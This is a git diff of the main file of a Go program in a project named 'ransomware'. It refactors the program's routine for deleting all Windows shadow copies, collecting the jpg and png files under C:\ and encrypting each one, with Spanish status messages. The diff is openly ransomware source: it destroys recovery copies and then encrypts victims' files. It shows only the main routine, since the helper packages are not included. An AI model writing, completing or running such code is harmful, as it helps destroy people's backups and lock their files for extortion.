@@ -2,24 +2,26 @@ package main
 
 import (
 	"fmt"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"strings"
-	"ransom/utils"
+	"ransomware/encript"
+	"ransomware/utils"
 )
 
 func main() {
-	errShadowCopies := DeleteAllShadowCopies()
+	resultInfo, errShadowCopies := utils.DeleteAllShadowCopies()
 	if errShadowCopies != nil {
-		fmt.Println("Error:", errShadowCopies)
-	return
+		panic(errShadowCopies)
 	}
-	files := ListFiles(`C:\`, []string{"jpg", "png"}) 
-
+	fmt.Println(resultInfo)
+	files, errListFiles := utils.ListFiles(`C:\`, []string{"jpg", "png"})
+	if errListFiles != nil {
+		panic(errListFiles)
+	}
 	fmt.Println("Cifrando los siguientes archivos:")
-	for _,file := range files {
-		EncryptFile(file)
+	for _, file := range files {
+		errEncrypt := encript.EncryptFile(file)
+		if errEncrypt != nil {
+			println("Error encriptando:", file, "\n", errEncrypt)
+		}
 		fmt.Println(file)
 	}
 }
